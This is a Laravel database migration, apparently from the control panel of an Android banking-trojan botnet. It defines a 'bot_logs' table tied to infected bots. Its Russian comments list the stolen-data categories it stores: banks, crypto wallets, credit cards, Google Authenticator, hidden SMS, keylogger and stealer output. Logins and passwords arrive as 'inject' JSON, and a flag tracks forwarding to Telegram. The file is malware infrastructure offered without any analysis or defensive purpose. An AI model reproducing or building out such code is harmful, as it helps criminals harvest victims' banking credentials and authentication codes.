<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

class CreateBotLogsTable extends Migration
{
    /**
     * Run the migrations.
     */
    public function up(): void
    {
        Schema::create('bot_logs', function (Blueprint $table) {
            $table->id();

            $table->string('bot_id');

            $table->string('application')
                ->index()
                ->nullable()
                ->comment('Название пакета приложения. Пример: org.app.name. Необязательный параметр');

            $table->string('type')
                ->comment("Тип лога. Доступные типы: 'banks', 'crypt', 'wallets', 'shops', 'credit_cards', 'emails', 'sms', 'events', 'googleauth', 'hidesms', 'keylogger', 'mail', 'otheraccounts', 'phonenumber', 'pushlist', 'ussd', 'stealers'");

            $table->json('log')
                ->comment('JSON массив с данными инжекта, в любом формате. {"login": "log", "password": "pass", ...}');

            $table->string('comment')->nullable();

            $table->boolean('telegram_accepted')
                ->default(false)
                ->index();

            $table->timestamps();

            $table->foreign('bot_id')
                ->references('id')
                ->on('bots')
                ->onDelete('cascade')
                ->onUpdate('cascade');

            $table->index('type');
        });
    }

    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        Schema::dropIfExists('bot_logs');
    }
}
